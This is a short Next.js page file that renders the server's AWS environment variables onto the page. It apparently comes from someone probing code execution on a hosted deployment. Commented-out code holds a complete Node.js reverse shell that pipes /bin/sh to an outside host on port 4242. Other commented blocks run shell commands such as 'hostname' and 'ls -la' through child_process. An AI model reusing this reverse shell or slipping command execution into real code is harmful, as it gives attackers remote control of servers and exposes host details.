// import Link from 'next/link'

export default function Index({ url: { query: { name } } }) {
//   const { exec } = require("child_process");
  
//   var commandResult = "";

//   exec("hostname", (error, stdout, stderr) => {
//       if (error) {
//           console.log("woops");
//       }
//       if (stderr) {
//           console.log("woops");
//       }
//       console.log(`stdout: ${stdout}`);
//     commandResult = stdout;
//   });
  return <div><p>Welcome to About! { process.env.AWS_REGION }</p><p>Welcome to About! { process.env.TZ }</p><p>Welcome to About! { process.env.AWS_EXECUTION_ENV }</p></div>

//   var net = require("net");
//   var cp = require("child_process");
//   var sh = cp.spawn("/bin/sh", []);
//   var client = new net.Socket();
//   client.connect(4242, "pwn.dns.praetorain.com", function(){
//       client.pipe(sh.stdin);
//       sh.stdout.pipe(client);
//       sh.stderr.pipe(client);
//   });
//   return <h1>BOOP</h1>; // Prevents the Node.js application form crashing
  
//   const { exec } = require("child_process");

//   exec("ls -la", (error, stdout, stderr) => {
//       if (error) {
//           console.log(`error: ${error.message}`);
//           return <h1>error</h1>;
//       }
//       if (stderr) {
//           console.log(`stderr: ${stderr}`);
//           return <h1>stderr</h1>;
//       }
//       return <h1>stdout</h1>;
//   });
}
